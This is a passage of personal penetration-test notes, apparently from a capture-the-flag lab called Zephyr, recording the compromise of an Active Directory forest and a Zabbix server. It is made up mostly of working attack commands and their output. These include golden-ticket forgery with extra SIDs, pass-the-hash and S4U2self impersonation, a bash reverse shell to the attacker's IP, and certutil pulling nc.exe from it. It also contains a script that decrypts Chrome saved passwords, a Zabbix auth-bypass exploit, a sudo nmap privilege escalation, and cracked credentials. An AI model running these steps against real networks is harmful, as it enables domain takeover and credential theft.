distinguishedname      : CN=Enterprise Admins,CN=Users,DC=zsm,DC=local
objectguid             : 028b118a-e895-48bf-a061-7501413b9874
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local

usncreated             : 12453
admincount             : 1
name                   : Enterprise Key Admins
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Key Admins
whenchanged            : 15/03/2022 15:35:44
objectsid              : S-1-5-21-2734290894-461713716-141835440-527
objectclass            : {top, group}
grouptype              : UNIVERSAL_SCOPE, SECURITY
cn                     : Enterprise Key Admins
usnchanged             : 12753
dscorepropagationdata  : {15/03/2022 15:35:44, 15/03/2022 15:20:34, 01/01/1601 00:04:16}
iscriticalsystemobject : True
description            : Members of this group can perform administrative actions on key objects within the forest.
distinguishedname      : CN=Enterprise Key Admins,CN=Users,DC=zsm,DC=local
whencreated            : 15/03/2022 15:20:34
instancetype           : 4
objectguid             : 89c39d61-179c-4842-9880-e8c852714e14
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local

usncreated             : 12429
name                   : Enterprise Read-only Domain Controllers
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Read-only Domain Controllers
whenchanged            : 15/03/2022 15:20:34
objectsid              : S-1-5-21-2734290894-461713716-141835440-498
objectclass            : {top, group}
grouptype              : UNIVERSAL_SCOPE, SECURITY
cn                     : Enterprise Read-only Domain Controllers
usnchanged             : 12431
dscorepropagationdata  : {15/03/2022 15:20:34, 01/01/1601 00:00:01}
iscriticalsystemobject : True
description            : Members of this group are Read-Only Domain Controllers in the enterprise
distinguishedname      : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=zsm,DC=local
whencreated            : 15/03/2022 15:20:34
instancetype           : 4
objectguid             : 66fa3db0-5435-4520-a2c0-054300cd74b5
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local
```

9. Now use either, ticketer.py, Rubeus.exe or mimikatz.exe to forge a golden ticket so next we can ask for TGT and impersonate on the PARENT domain with something similar:

I'll use mimikatz.exe for this.

Syntax to get an golden ticket is:

```
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:baby.endark.local /sid:<Child Domain SID> /krbtgt:<krbtgt hash> /sids:<EnterpriseAdmin SID>" "exit"
```

But first start it.

```
mimikatz.exe
privilege::debug
```

10. Generate Golden Ticket

The Parent Domain will trust us because the child domain will have the SID of the "Enterprise Domain Admins" Group in there SID History, because it's injected here.

```
mimikatz # kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /krbtgt:0540fe51ddd618f42a66ef059ac36441 /sids:S-1-5-21-2734290894-461713716-141835440-519
User      : Administrator
Domain    : internal.zsm.local (INTERNAL)
SID       : S-1-5-21-3056178012-3972705859-491075245
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-2734290894-461713716-141835440-51 ; 
ServiceKey: 0540fe51ddd618f42a66ef059ac36441 - rc4_hmac_nt      
Lifetime  : 03/08/2026 01:24:23 ; 31/07/2036 01:24:23 ; 31/07/2036 01:24:23
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

11. Check Kerberos Tickets

```
mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 19/09/2023 08:51:29 ; 19/09/2023 18:51:29 ; 26/09/2023 08:51:29
   Server Name       : krbtgt/INTERNAL.ZSM.LOCAL @ INTERNAL.ZSM.LOCAL
   Client Name       : yovecio @ INTERNAL.ZSM.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
```

12. Inject the Golden Ticket into Session.

```
mimikatz # kerberos::ptt ticket.kirbi

* File: 'ticket.kirbi': OK
```

13. Reassure if it worked:

```
mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 19/09/2023 09:28:43 ; 16/09/2033 09:28:43 ; 16/09/2033 09:28:43
   Server Name       : krbtgt/internal.zsm.local @ internal.zsm.local
   Client Name       : Administrator @ internal.zsm.local
   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
```

14. Download ticket.kirbi

On local machine:

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

On target machine:

```
net use m: \\10.10.14.63\test /user:saitama saitama
```

Downloaded golden ticket onto my local machine.

```
copy ticket.kirbi m:\
```

15. Converted Golden Ticket to .ccache format.

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

16. Now we can use the variable KRB5CCNAME to either map the ticket to the variable or always use the variable with the ticket e.G

```
export KRB5CCNAME=ticket.ccache
```

17. Authenticate against the DC

WARNING: Your DNS Entries need to be correct or it won't work.

```
impacket-wmiexec internal.zsm.local/Administrator@ZPH-SVRDC01.zsm.local -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] [Errno Connection error (ZPH-SVRDC01.zsm.local:445)] [Errno -2] Name or service not known
```

---
## Fast Way of Domain Trust Abuse

```
nxc ldap 192.168.210.16 -u Administrator -H 543beb20a2a579c7714ced68a1760d5e -M raisechild -o ETYPE=aes256
LDAP        192.168.210.16  389    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:None) (channel binding:Always) 
LDAP        192.168.210.16  389    ZPH-SVRCDC01     [+] internal.zsm.local\Administrator:543beb20a2a579c7714ced68a1760d5e (Pwn3d!)                                                                                                                        
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [*] Running raisechild module...
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Child Domain SID: S-1-5-21-3056178012-3972705859-491075245
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Parent domain name: zsm.local
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Parent domain SID:  S-1-5-21-2734290894-461713716-141835440
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     krbtgt AES256 key: 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0                                                                                                                   
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Golden ticket forged successfully (etype: aes256). Saved to: Administrator.ccache
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Run the following command to use the TGT: export KRB5CCNAME=Administrator.ccache

```

```
export KRB5CCNAME=Administrator.ccache
```

```
nxc smb 192.168.210.10 --use-kcache                                                                               
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] INTERNAL.ZSM.LOCAL\Administrator from ccache (Pwn3d!)
```

Gained Domain Admin Credentials for Parent Domain which means I've comprimised everything!

```
Administrator:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

Let's comprimise all target's now! ;) Nevermind! Didn't work!

```
impacket-psexec Administrator@ZPH-SVRDC01.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

Didn't work either!

```
impacket-wmiexec zsm.local/Administrator@ZPH-SVRDC01.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

I got an nudge from someone and I had to connect to zabbix and create another pivot.

It was important that I remove my double pivot completly and route the second pivot from zabbix server, not from the DC at 192.168.110.55

After breaking the pivot from 192.168.110.55 I created an pivot from zabbix and added the following route.

```
ip route add 192.168.210.0/24 dev ligolo-triple
```

After that WinRM was accessible for me on many targets.

```
evil-winrm -i 192.168.210.10 -u Administrator -H 84210eddc5724a7801fe78289ee94d44
```

Successfully connected to the target.

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}
```





---
## ZEPHYR-MGMT [x]

```
Nmap scan report for 192.168.210.11
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T17:26:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 2s
```

We have the NTLM Hash of the machine account of this target.

Since we couldn't dump any credentials, I decided to perform an gets4uself attack. 

In order to do so I will first request an TGT for my machine account.

```
impacket-getTGT zsm.local/ZPH-SVRMGMT1$ -hashes :89d0b56874f61ad38bad336a77b8ef2f
```

2. Impersonated & requested Administrator TGT.

```
minikerberos-getS4U2self kerberos+ccache://zsm.local\\ZPH-SVRMGMT1\$:'ZPH-SVRMGMT1$.ccache'@192.168.210.10 cifs/ZPH-SVRMGMT1.zsm.local@192.168.210.10 Administrator@zsm.local --ccache Administrator.ccache
Ticket stored in ccache file Administrator.ccache

Realm        : ZSM.LOCAL
Sname        : cifs/ZPH-SVRMGMT1.zsm.local
UserName     : Administrator
UserRealm    : zsm.local
StartTime    : 2026-08-01 22:38:46+00:00
EndTime      : 2026-08-02 08:19:09+00:00
RenewTill    : 2026-08-02 22:19:05+00:00
Flags        : forwardable, pre-authent, renewable, enc-pa-rep
Keytype      : 23
Key          : ow5XFoOHjk54w89GdMRdHg==
EncodedKirbi : 

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
```

3. Stored kirbi in Administrator.kirbi

4. Converted kirbi into .ccache format (for linux)

```
impacket-ticketConverter Administrator.kirbi Administrator.ccache
```

5. Export Ticket

```
export KRB5CCNAME=Administrator.ccache
```

5. Connect to target

WARNING: When connecting it's important that we utilize the cifs not the target ip address **cifs/ZPH-SVRMGMT1.zsm.local** of the s4u2self output.

```
impacket-psexec -k -no-pass zsm.local/Administrator@ZPH-SVRMGMT1.ZSM.LOCAL -target-ip 192.168.210.11
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}
```

Transfered nc.exe onto the target server to get an better shell!

```
certutil -urlcache -split -f http://10.10.14.63:445/nc.exe nc.exe
```

I enumerated all C:\Users Directory and found an interesting "ChromeSetup.exe" in "marcus" directory. Let's try & check his Browser History.

```
tree . /f
```

Utilizing Seatbelt.exe to enumerate Browser History's and DNS Cache's was very successfull.

```
Seatbelt.exe FirefoxHistory ChromiumHistory DNSCache
```

I gained information about two new internal endpoints 192.168.210.17 & 192.168.210.18

```
192.168.210.17 -> zephyr.bamboohr.htb
192.168.210.18 -> zephyr.atlassian.htb
```

I tried to enumerate the chrome history further and was able to find smth interesting with mimikatz.

```
mimikatz # dpapi::chrome /in:"C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data"
URL     : https://zephyr.atlassian.htb/ ( https://zephyr.atlassian.htb/ )
Username: melissa
ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption
```

Dumped dpapi keys with mimikatz and found this interesting entry for user "marcus".

```
GUID      :  {97bd0c8e-87ad-468b-96bd-4799372dab18}
         * Time      :  02/08/2026 02:11:09
         * MasterKey :  3181bd14624fe4bfd59c6a98966e93bc323d94d84b38580dd2546f3c03fa4b3e762e9a16c009758d740652fde81d526bfd4b5833e5e508d16f47fa8d7e748c58
         * sha1(key) :  a74fe7458718840bd9ed0bd2d63dbe0bdc3a84e8
```

But this wasn't sufficient or enough. Since it's an Chrome Login Entry, the DPAPI encrypted key is in:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Local State
```

This is the JSON file that has the DPAPI protected encrypted key, which we'll need for decoding the actual AES encrypted password.

This password is stored in the SQLite DB File:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

We start with the downloading the DPAPI Key

On local machine:

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

On target machine:

```
net use m: \\10.10.14.63\test /user:saitama saitama
```

Navigated into path, so we can download the "Local State" File which

```
cd C:\Users\marcus\AppData\Local\Google\Chrome\User Data
```

Downloaded file to local machine.

```
copy "Local State" m:\
```

Ran the following script to extract the dpapi key out of the "Local State" file.

It does the following:

1. `json.load(open('Local State'))['os_crypt']['encrypted_key']`  
    → Grabs the Base64 string from the `Local State` file, e.g.  
    `"RFBBUEkBAAAA...."`
    
2. base64.b64decode(...)
    → Decodes it into bytes. The first bytes are always the ASCII string **`DPAPI`** (hex `44 50 41 50 49`).
    
3. `[5:]`  
    → Strips those 5 bytes (`DPAPI`). What remains is the pure DPAPI blob that `impacket-dpapi` needs.

```
1. `python3 -c "import json,base64; open('blob','wb').write(base64.b64decode(json.load(open('Local State'))['os_crypt']['encrypted_key'])[5:])"`
```

It's not stored as an "blob" value, which represents the the raw encrypted DPAPI structure and it seems to be binary.

Let's now get the decrypted AES-256 key using impacket-dpapi.

```
impacket-dpapi unprotect -f blob -key 0x9a1d05826ba4996fff4247152075f389a38b0a97f07763dd4adaa99177b4e04cef644b33dc3e4fbc211b6d16d3b343ede06be50f3d89e82d2d5480567d2a8737
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Successfully decrypted data
 0000   F9 16 1E 38 0A 7F BF 9C  67 26 26 74 A2 B7 AC 6A   ...8....g&&t...j
 0010   E1 EE 72 62 13 DD 5A 3B  0F E6 E4 5D 34 95 59 96   ..rb..Z;...]4.Y.
```

We decrypted the AES Key and got it as hex value! Save this in an file. So it looks like this: 

```
F9161E380A7FBF9C67262674A2B7AC6AE1EE726213DD5A3B0FE6E45D34955996
```

Now we need to download the "Login Data" File in:

```
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

This represents the SQLite Database in which the actual encrypted password is stored of chrome browser logins.

```
copy "Login Data" m:\
```

Utilized the following script in order to decrypt the password of user "melissa".

```
#!/usr/bin/env python3
import sqlite3, argparse, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_password(blob, key):
    if blob[:3] in (b'v10', b'v11'):
        nonce = blob[3:15]
        ciphertext = blob[15:-16]
        tag = blob[-16:]
    else:
        return "[Unknown format]"
    try:
        return AESGCM(key).decrypt(nonce, ciphertext + tag, None).decode()
    except:
        return "[Decryption error]"

def main():
    parser = argparse.ArgumentParser(description='Decrypt Chrome passwords using an AES key.')
    parser.add_argument('login_data', help='Path to Login Data file')
    parser.add_argument('key', help='64‑char hex AES key (from DPAPI unprotect)')
    parser.add_argument('--output', '-o', help='Output file (CSV)')
    args = parser.parse_args()

    key = bytes.fromhex(args.key)
    conn = sqlite3.connect(args.login_data)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")

    rows = []
    for url, user, pwd in cur.fetchall():
        pw = decrypt_password(pwd, key)
        rows.append((url, user, pw))
        print(f"[*] {url} | {user} : {pw}")

    conn.close()

    if args.output:
        with open(args.output, 'w') as f:
            for r in rows:
                f.write(f'"{r[0]}","{r[1]}","{r[2]}"\n')
        print(f"[+] Saved to {args.output}")

if __name__ == "__main__":
    main()

```

Ran the command with the SQLite Database file and the decrypted DPAPI Key.

```
python3 chrome_browser_cred_decryption.py "Login Data" F9161E380A7FBF9C67262674A2B7AC6AE1EE726213DD5A3B0FE6E45D34955996
[*] https://zephyr.atlassian.htb/ | melissa : WinterIsHere2022!
```

Stored these credentials and moved onto ZEPHYR-CA.

---
## ZEPHYR-CA

```
Nmap scan report for 192.168.210.12
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49688/tcp open  msrpc         Microsoft Windows RPC
49758/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 2s
| smb2-time: 
|   date: 2026-08-01T01:32:12
|_  start_date: N/A
```

Sprayed credentials here aswell also anonymous & guest access but nothing was able to authenticate against the target. Let's move onto the next endpoint!

Upon viewing bloodhound and marking user marcus as owned, we found plenty of interesting ACL's.

1. ForceChangePassword on user "jamie".
2. AddKeyCredentialLink on ZEPHYR-MGMT
3. Enroll in ZEPHYR-CA

Since CA Managers include the ca_svc service account we wanted to request the NTLM Hash of it, but this didn't work.

Let's try & abuse the 2. ACL AddKeyCredentialLink on ZEPHYR-MGMT

It means we can create shadow credentials and get the machine account's NTLM Hash

```
certipy-ad shadow auto -u marcus@zsm.local -p '!QAZ2wsx' -account ZPH-SVRMGMT1$ -dc-ip 192.168.210.10
```

We now can authenticate as machine account.

I added the machine account to the general management group.

```
bloodyad -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 add groupMember 'General Management' ZPH-SVRMGMT1$
```

Changed Password of user jamie.

```
bloodyad -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 set password jamie 'password123!'
```

Added user jamie to CA Managers Group.

```
bloodyAD -u jamie -p 'password123!' -d zsm.local --host 192.168.210.10 add groupMember 'CA Managers' jamie
```



```

```



```

```



```

```



```

```



```

```



```

```

---
## ZEPHYR-ZABBIX [x]

```
Nmap scan report for 192.168.210.13
Host is up (0.027s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=monitor.zsm.local/organizationName=Zephyr Managed Services/stateOrProvinceName=London/countryName=GB
| Not valid before: 2022-03-21T19:39:06
|_Not valid after:  2032-03-18T19:39:06
|_http-title: Zabbix
| http-robots.txt: 2 disallowed entries 
|_/ /zabbix/".
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Inspecting the https webpage provides us with an zabbix login panel. When clicking on help we are getting forwarded to an zabbix documentation for version 5.4. Searched up public exploits and found  CVE-2022-23131 which bypasses authentication and can give us access to the Zabbix Frontend which allows us to manipulate built-in script functionalities to grant us RCE.

Upon pressing on SSO we are getting forwarded to an subdomain called. Let's map it to the target ip address in our local dns file.

```
echo "192.168.210.13 adfs.zsm.local" | tee -a /etc/hosts
```

Enumerated endpoints with dirsearch & found an interesting /composer.json which revealed information about Zabbix Version v5.1.3

```
dirsearch -u https://192.168.210.13
```

I utilized the following exploit:

```
git clone https://github.com/Mr-xn/cve-2022-23131.git
```

This exploit will steal the session cookie of an Account. In our case the "admin" account. But in order to retrieve the package we'll need to funnel it though an web-proxy tool. I will utilize BurpSuite for this endavour.

1. Start up BurpSuite > Proxy > Intercept on

2. Execute the following command:

```
python3 zabbix_session_exp.py -t https://192.168.210.13/index.php -u admin -p http://localhost:8080
```

3. Forwarded the first package

4. Captured the zbx_session cookie.

5. Right clicked on login panel > Inspect > Storage & replaced the current cookie with the zxb_session cookie.

6. Pressed on SSO & gained admin access to the zabbix interface.

Inspecting the "Hosts" tab reveals plenty of information about all the available endpoints on the subnet.

```
ZPH-SVRADFS1 -> .14
ZPH-SVRSQL01 -> .15
ZPH-SRVMGMT1 -> .11
```

Before enumerating all the discovered endpoints I will try to root this target machine.
First step is to get RCE through the zabbix admin panel.

Upon inspecting Administration > Users I retrieved a new user called "marcus".

In order to gain RCE on Zabbix > Navigate to Administration > Scripts > Create Script, choose Manual host action, Script & Zabbix Server.

Paste the following reverse shell script inside (depending on the underlying OS)

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.64/53 0>&1'
```

Started up netcat listener on local machine.

```
nc -lvnp 53
```

Then Navigated to Monitoring > Hosts > Press on Server u want to get RCE on > Choose ur script and this executes the script.

Gained RCE.

```
nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.110.35] 10661
bash: cannot set terminal process group (16451): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zephyr:/$
```

Revealed that we can execute the nmap binary as root user without authentication required! 

```
sudo -l
Matching Defaults entries for zabbix on zephyr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zabbix may run the following commands on zephyr:
    (root) NOPASSWD: /usr/bin/nmap
```

Checked gtfobins.org and there is an ez privesc way with nmap --interactive. Unfortunately our nmap binary doesn't have this. Which means we'll need to utilize the inherit script. By creating an lua script.

Let's create an lua script in /tmp directory.

```
echo 'os.execute("/bin/bash")' > /tmp/shell.lua
```

Executed the nmap binary with sudo permissions and gained root shell.

```
sudo nmap --script=/tmp/shell.lua
```

Retrieved flag.txt in /root directory.

```
ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}
```

Since we found out that there is an user named marcus in the zabbix application, let's try & get his credentials!

Navigated to /var/www/html/conf and found an zabbix.conf.php file which revealed database credentials.

```
zabbix:rDhHbBEfh35sMbkY
```

Enumerated internally running services and found an MySQL Database running internally on the server.

```
netstat -tulnp
```

Let's connect internally

```
mysql -u zabbix -p
```

Enumerated Database

```
show databases;
use zabbix;
show tables;
SELECT * FROM users;
```

This provided us with the encoded password of user marcus.

```
marcus:$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.
```

Utilized John the Ripper to bruteforce the encoded password.

```
john marcus --wordlist=/usr/share/wordlists/rockyou.txt
```

Retrieved credentials.

```
marcus:!QAZ2wsx
```

Moved onto other targets.

---
## ZEPHYR-ADFS

```
nmap -n -Pn -sSCV -p- 192.168.210.14
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 17:31 -0500
Stats: 0:05:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 67.48% done; ETC: 17:39 (0:02:37 remaining)
Nmap scan report for 192.168.210.14
Host is up (0.11s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  https?
445/tcp   open  microsoft-ds?
49443/tcp open  unknown
49686/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 627.69 seconds
```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```




```

```



```

```

---
## ZEPHYR-SQL01

```
Nmap scan report for 192.168.210.15
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49683/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T17:26:47
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```



```

```



```

```



```

```




```

```



```

```

---
## ZEPHYR-CDC

```
Nmap scan report for 192.168.210.16
Host is up (0.027s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-01 01:31:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2026-01-20T15:28:01
|_Not valid after:  2027-01-20T15:28:01
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2026-01-20T15:28:01
|_Not valid after:  2027-01-20T15:28:01
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2026-01-20T15:28:01
|_Not valid after:  2027-01-20T15:28:01
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: zsm.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ZPH-SVRCDC01.internal.zsm.local
